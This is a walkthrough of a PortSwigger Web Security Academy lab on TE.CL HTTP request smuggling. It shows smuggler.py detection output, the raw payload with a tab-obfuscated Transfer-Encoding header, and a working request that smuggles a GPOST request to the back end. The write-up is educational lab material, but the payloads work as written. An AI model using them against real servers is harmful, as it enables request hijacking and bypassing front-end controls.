# [Lab: HTTP request smuggling, basic TE.CL vulnerability](https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl)

## Lab

This lab involves a front-end and back-end server, and the back-end server doesn't support chunked encoding. The front-end server rejects requests that aren't using the GET or POST method.

To solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method `GPOST`.

## Detect TE.CL

- smuggler.py:

```bash
┌──(kali㉿kali)-[~/Documents/tools]
└─$ python smuggler/smuggler.py -u https://0a86009804f650b8c2ac2592004e006a.web-security-academy.net/

  ______                         _                                                                                                                                                                                                         
 / _____)                       | |                                                                                                                                                                                                        
( (____  ____  _   _  ____  ____| | _____  ____                                                                                                                                                                                            
 \____ \|    \| | | |/ _  |/ _  | || ___ |/ ___)                                                                                                                                                                                           
 _____) ) | | | |_| ( (_| ( (_| | || ____| |                                                                                                                                                                                               
(______/|_|_|_|____/ \___ |\___ |\_)_____)_|                                                                                                                                                                                               
                    (_____(_____|                                                                                                                                                                                                          
                                                                                                                                                                                                                                           
     @defparam                         v1.1                                                                                                                                                                                                
                                                                                                                                                                                                                                           
[+] URL        : https://0a86009804f650b8c2ac2592004e006a.web-security-academy.net/
[+] Method     : POST
[+] Endpoint   : /
[+] Configfile : default.py
[+] Timeout    : 5.0 seconds
[+] Cookies    : 1 (Appending to the attack)
[nameprefix1]  : OK (TECL: 0.90 - 200) (CLTE: 1.02 - 200)                                           
[tabprefix1]   : Potential TECL Issue Found - POST @ https://0a86009804f650b8c2ac2592004e006a.web-security-academy.net/ - default.py                                                                                                       
[CRITICAL]     : TECL Payload: /home/kali/Documents/tools/smuggler/payloads/https_0a86009804f650b8c2ac2592004e006a_web-security-academy_net_TECL_tabprefix1.txt URL: https://0a86009804f650b8c2ac2592004e006a.web-security-academy.net/ 

┌──(kali㉿kali)-[~/Documents/tools]
└─$ cat -A /home/kali/Documents/tools/smuggler/payloads/https_0a86009804f650b8c2ac2592004e006a_web-security-academy_net_TECL_tabprefix1.txt
POST /?cb=018225143592607074 HTTP/1.1^M$
Transfer-Encoding:^Ichunked^M$
Host: 0a86009804f650b8c2ac2592004e006a.web-security-academy.net^M$
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.87 Safari/537.36^M$
Content-type: application/x-www-form-urlencoded; charset=UTF-8^M$
Content-Length: 6^M$
Cookie:  session=pqvflqf2l2ctrvqwmaau38jzwfmzd79f;^M$
^M$
0^M$
^M$
X
```

- burpsuite `HTTP request smuggler` extension:

![detect.png](./../img/lab-2-extension-detect.png)

## Solutions

```http
POST / HTTP/1.1^M$
Content-Length: 4^M$
Transfer-Encoding: chunked^M$
^M$
29^M$
GPOST / HTTP/1.1^M$
Content-Length: 20^M$
^M$
a^M$
0^M$
^M$
```

backend:

  ```http
  POST / HTTP/1.1^M$
  Content-Length: 4^M$
  Transfer-Encoding: chunked^M$
  ^M$
  29^M$
  ```

  ```http
  GPOST / HTTP/1.1^M$
  Content-Length: 20^M$
  ^M$
  a^M$
  0^M$
  ^M$
  ```
